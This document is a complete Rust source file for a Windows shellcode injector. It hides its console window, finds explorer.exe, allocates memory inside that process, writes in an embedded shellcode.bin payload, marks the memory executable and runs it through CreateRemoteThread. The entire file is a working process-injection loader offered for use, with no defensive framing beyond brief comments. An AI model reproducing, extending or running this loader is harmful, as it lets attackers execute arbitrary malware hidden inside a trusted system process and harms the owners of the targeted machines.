#![windows_subsystem = "windows"] // For hiding console
#![allow(non_snake_case)]
// Using windows crate for proper functioning in Windows
use windows::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

const ACCESS: PROCESS_ACCESS_RIGHTS = PROCESS_ACCESS_RIGHTS(
    PROCESS_CREATE_THREAD.0
        | PROCESS_QUERY_INFORMATION.0
        | PROCESS_VM_OPERATION.0
        | PROCESS_VM_WRITE.0
        | PROCESS_VM_READ.0,
);
// Finding PID of "explorer.exe" so we can inject the shellcode.bin into that process (Creating thread!)
fn find_pid(name: &str) -> Option<u32> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        if snap == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        let target = name.as_bytes();
        let mut pid = None;

        if Process32First(snap, &mut entry).is_ok() {
            loop {
                let exe = &entry.szExeFile;
                let len = exe.iter().position(|&b| b == 0).unwrap_or(exe.len());

                if len == target.len()
                    && exe[..len]
                        .iter()
                        .zip(target)
                        .all(|(&a, &b)| (a as u8).eq_ignore_ascii_case(&b))
                {
                    pid = Some(entry.th32ProcessID);
                    break;
                }

                if Process32Next(snap, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snap);
        pid
    }
}
// Performing the main function which will Open the process and Create a thread of our inejcted shellcode.bin and Execute it.
fn main() {
    let sc: &[u8] = include_bytes!("../shellcode.bin"); // Better put the shellcode.bin file, where the Cargo.toml file is available but you can specify the path of your shellcode.bin file here.
    if sc.is_empty() {
        return;
    }

    let pid = match find_pid("explorer.exe") {
        Some(p) => p,
        None => return,
    };

    unsafe {
        let process = match OpenProcess(ACCESS, false, pid) {
            Ok(h) => h,
            Err(_) => return,
        };

        let remote = VirtualAllocEx(
            process,
            None,
            sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote.is_null() {
            let _ = CloseHandle(process);
            return;
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            process,
            remote,
            sc.as_ptr() as *const _,
            sc.len(),
            Some(&mut written),
        )
        .is_err()
            || written != sc.len()
        {
            let _ = CloseHandle(process);
            return;
        }

        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtectEx(process, remote, sc.len(), PAGE_EXECUTE_READ, &mut old).is_err() {
            let _ = CloseHandle(process);
            return;
        }

        let start: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32 =
            std::mem::transmute(remote);

        if let Ok(thread) = CreateRemoteThread(process, None, 0, Some(start), None, 0, None) {
            let _ = CloseHandle(thread);
        }

        let _ = CloseHandle(process);
    }
}
